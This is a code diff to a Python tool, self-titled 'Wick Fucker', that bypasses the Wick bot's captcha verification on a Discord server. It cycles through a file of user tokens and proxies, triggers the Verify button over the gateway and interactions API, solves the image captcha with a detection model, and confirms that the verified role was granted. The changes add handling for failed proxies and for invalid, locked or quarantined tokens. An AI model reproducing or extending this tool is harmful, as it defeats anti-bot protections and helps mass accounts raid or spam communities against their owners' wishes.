@@ -39,9 +39,21 @@ print(Colorate.Diagonal(Colors.blue_to_purple, Center.XCenter(text)))
 channel_id = '1095065811401584664' #input('['+ Fore.BLUE + '>' + Fore.RESET + ']' + 'insert the channel id:')
 guild_id = '1095065810483028051'#input('['+ Fore.BLUE + '>' + Fore.RESET + ']' + 'insert the guild id:')
 button_id = '1185266006566912032'#input('['+ Fore.BLUE + '>' + Fore.RESET + ']' + 'insert the button id:')
+role_id = '1098079778206134282'
 
 failed = 0
 bypassed = 0
+locked = 0
+invalid = 0
+
+files_to_clear = ['invalid.txt', 'locked.txt', 'failed.txt']
+
+# Clear each file before the loop starts
+for file_name in files_to_clear:
+    with open(file_name, 'w'):
+        pass
+
+
 
 def connect(ws):
   ws.connect('wss://gateway.discord.gg/?encoding=json&v=9&compress=json')
@@ -113,7 +125,6 @@ def solveCaptcha(url, color = "30cf80") -> str:
   img = process(img, color)
 
   result = model(img)
-  print(result)
   a = result.pandas().xyxy[0].sort_values('xmin')
   while len(a) > 6: 
     lines = a.confidence
@@ -131,17 +142,17 @@ def check_proxy(proxy_address):
     try:
         response = requests.get("https://api.ipify.org", proxies={"https": proxy_address}, timeout=5)
         if response.status_code == 200:
-            print(f"Proxy {proxy_address} is working. Your IP: {response.text}")
+            return True
         else:
-            print(f"Proxy {proxy_address} returned status code {response.status_code}")
+            return False
     except Exception as e:
-        print(f"Error checking proxy {proxy_address}: {str(e)}") 
+        return False
+       
     
 with open("tokens.txt", "r") as f:
     lines = f.readlines()
     for line in lines:
         token, proxy_address = line.strip().split(",")
-        verified = 0
         # Create a dictionary with proxy settings
         proxies = {
             'http': proxy_address,
@@ -149,10 +160,15 @@ with open("tokens.txt", "r") as f:
         }
         
         if proxy_address:
-            check_proxy(proxy_address)
+            if not check_proxy(proxy_address):
+                with open('failed.txt', 'a') as file:
+                    file.write(token + '\n')
+                failed+=1
+                print('['+ Fore.RED + '!' + Fore.RESET + ']' + f'Failed to connect proxy for token {token[:-5]}.....')
+                continue
             
         # Perform your requests here using the token and proxies
-        System.Title(f"Wick Fucker by over_on_top - {bypassed} verification bypassed - {failed} verification failed")
+        System.Title(f"Wick Fucker by over_on_top - {bypassed} verification bypassed - {failed} verification failed - {locked} tokens locked - {invalid} tokens invalid")
         
         authorization = {
           'Authorization': token
@@ -173,6 +189,11 @@ with open("tokens.txt", "r") as f:
                     "url": "https://discord.com/api/v9/channels/{channel_id}/messages?limit=50",
                     "method": "GET",
                     "headers": "authorization"
+                },
+                {
+                    "url": "https://discord.com/api/v9/guilds/{guild_id}/members/{user_id}",
+                    "method": "GET",
+                    "headers": "authorization"
                 }
             ],
             "customIdRegex": {
@@ -185,17 +206,51 @@ with open("tokens.txt", "r") as f:
             }
         }
         user_response = requests.get(json_object["requests"][0]["url"], headers=json_object["authorization"],proxies=proxies).json()
-        token_id = user_response[json_object["requests"][0]["responseKey"]]
         
+        if json_object["requests"][0]["responseKey"] in user_response:
+            token_id = user_response[json_object["requests"][0]["responseKey"]]
+        else:
+            print('['+ Fore.RED + '!' + Fore.RESET + ']' + f'{token[:-5]}..... is invalid')
+            invalid+=1
+            with open('invalid.txt', 'a') as file:
+                file.write(token + '\n')
+            continue
+        
+        
+        message_response = requests.get(json_object["requests"][2]["url"].format(guild_id=guild_id,user_id=token_id), headers=json_object["authorization"], proxies=proxies)
+        guild_member_info = message_response.json()
+        
+        if 'roles' in guild_member_info:
+            if role_id in guild_member_info['roles']:
+                bypassed+=1
+                print('['+ Fore.GREEN + '+' + Fore.RESET + ']' + f'Verification bypassed correctly with {token[:-5]}.....')
+                continue
         # Make the second request to get the messages
         message_response = requests.get(json_object["requests"][1]["url"].format(channel_id=channel_id), headers=json_object["authorization"],proxies=proxies)
         response_content = message_response.json()
+            
+        if 'code' in response_content:
+            if response_content['code'] == 40002 or response_content['code'] == 40068:
+                locked+=1
+                print('['+ Fore.RED + '!' + Fore.RESET + ']' + f'{token[:-5]}..... needs to be verified or is quarantined')
+                with open('locked.txt', 'a') as file:
+                    file.write(token + '\n')
+                continue
 
+            if response_content['code'] == 50001:
+                failed+=1
+                print('['+ Fore.RED + '!' + Fore.RESET + ']' + f'{token[:-5]}..... is missing access')
+                with open('failed.txt', 'a') as file:
+                    file.write(token + '\n')
+                continue  
+
+        
         application_ids = []
         for message in response_content:
             application_id = message.get("author", {}).get("id")
             if application_id:
                 application_ids.append(application_id)
+        
         
         
         # Extract custom_id where label is "Verify"
@@ -209,6 +264,7 @@ with open("tokens.txt", "r") as f:
                         if sub_component.get("label") == "Verify":
                             custom_id = sub_component.get("custom_id")
                             custom_ids.append(custom_id)   
+
         headers = {
           'Accept': '*/*',
           'Accept-Encoding': 'gzip, deflate, br',
@@ -254,46 +310,43 @@ with open("tokens.txt", "r") as f:
         while True:
             response = json.loads(ws.recv())
             if response['t'] == 'MESSAGE_CREATE':
-                try:
+                try:  
                   value = response['d']['embeds'][0]['fields'][0]['value']
                   if value == '`Please type the captcha below to be able to access this server!`':
                     message_id = response['d']['id']
                     link = response['d']['embeds'][0]['image']['url']
                     ws.close()
                     break
-                    
-                  embed_description = response['d']['embeds'][0]['description']
-                  if 'You are verified already!' in embed_description:
-                    print("You are already verified. Exiting loop.")
-                    verified=1
-                    print('['+ Fore.GREEN + '+' + Fore.RESET + ']' + f'Verification bypassed correctly with {token[:-5]}.....')
-                    break
-              
+
                 except:
                   continue
-        if verified==0:
-            print('['+ Fore.GREEN + '+' + Fore.RESET + ']' + 'Captcha obtained correctly')
-            print('['+ Fore.BLUE + '>' + Fore.RESET + ']' + 'Bypassing captcha...')
-                
-            connect(ws)
-            r = requests.post("https://discord.com/api/v9/interactions", headers=headers, json={"type":3,"nonce":"".join([str(random.randint(1, 9)) for _ in range(19)]),"guild_id":guild_id,"channel_id":channel_id,"message_flags":64,"message_id":message_id,"application_id":application_id,"session_id":"".join(random.choice(string.ascii_letters + string.digits) for _ in range(32)),"data":{"component_type":2,"custom_id":f"mver_{guild_id}_{token_id}"}},proxies=proxies)
-            while True:
-              response = json.loads(ws.recv())
-              if response['t'] == 'INTERACTION_SUCCESS':
-                id_value = response['d']['id']
-                ws.close()
-                break
-            print(link)
-            captcha = solveCaptcha(link)
-            print('['+ Fore.GREEN + '+' + Fore.RESET + ']' + f'Captcha bypassed: {captcha}')
-            print('['+ Fore.BLUE + '>' + Fore.RESET + ']' + 'Bypassing verification...')
+        print('['+ Fore.GREEN + '+' + Fore.RESET + ']' + 'Captcha obtained correctly')
+        print('['+ Fore.BLUE + '>' + Fore.RESET + ']' + 'Bypassing captcha...')
             
-            r = requests.post("https://discord.com/api/v9/interactions", headers=headers, json={"type":5,"application_id":application_id,"channel_id":channel_id,"guild_id":guild_id,"data":{"id":id_value,"custom_id":f"modalmmbrver_{token_id}","components":[{"type":1,"components":[{"type":4,"custom_id":"answer","value":captcha}]}]},"session_id":"".join(random.choice(string.ascii_letters + string.digits) for _ in range(32)),"nonce":"".join([str(random.randint(1, 9)) for _ in range(19)])},proxies=proxies)
-            time.sleep(1)
-            r = requests.get('https://discord.com/api/v9/channels/{channel_id}/messages?limit=50', headers=authorization,proxies=proxies)
-            if r.status_code == 200:
-              failed+=1
-              print('['+ Fore.RED + '!' + Fore.RESET + ']' + f'Verification bypass failed with {token[:-5]}.....')
-            else:
-              bypassed+=1
-              print('['+ Fore.GREEN + '+' + Fore.RESET + ']' + f'Verification bypassed correctly with {token[:-5]}.....')
+        connect(ws)
+        r = requests.post("https://discord.com/api/v9/interactions", headers=headers, json={"type":3,"nonce":"".join([str(random.randint(1, 9)) for _ in range(19)]),"guild_id":guild_id,"channel_id":channel_id,"message_flags":64,"message_id":message_id,"application_id":application_id,"session_id":"".join(random.choice(string.ascii_letters + string.digits) for _ in range(32)),"data":{"component_type":2,"custom_id":f"mver_{guild_id}_{token_id}"}},proxies=proxies)
+        while True:
+          response = json.loads(ws.recv())
+          if response['t'] == 'INTERACTION_SUCCESS':
+            id_value = response['d']['id']
+            ws.close()
+            break
+        captcha = solveCaptcha(link)
+        print('['+ Fore.GREEN + '+' + Fore.RESET + ']' + f'Captcha bypassed: {captcha}')
+        print('['+ Fore.BLUE + '>' + Fore.RESET + ']' + 'Bypassing verification...')
+        
+        r = requests.post("https://discord.com/api/v9/interactions", headers=headers, json={"type":5,"application_id":application_id,"channel_id":channel_id,"guild_id":guild_id,"data":{"id":id_value,"custom_id":f"modalmmbrver_{token_id}","components":[{"type":1,"components":[{"type":4,"custom_id":"answer","value":captcha}]}]},"session_id":"".join(random.choice(string.ascii_letters + string.digits) for _ in range(32)),"nonce":"".join([str(random.randint(1, 9)) for _ in range(19)])},proxies=proxies)
+        time.sleep(5)
+
+        message_response = requests.get(json_object["requests"][2]["url"].format(guild_id=guild_id,user_id=token_id), headers=json_object["authorization"], proxies=proxies)
+        guild_member_info = message_response.json()
+        
+        if 'roles' in guild_member_info:
+            if role_id in guild_member_info['roles']:
+                bypassed+=1
+                print('['+ Fore.GREEN + '+' + Fore.RESET + ']' + f'Verification bypassed correctly with {token[:-5]}.....')
+            else: 
+                with open('failed.txt', 'a') as file:
+                    file.write(token + '\n')
+                failed+=1
+                print('['+ Fore.RED + '!' + Fore.RESET + ']' + f'Verification bypass failed with {token[:-5]}.....')
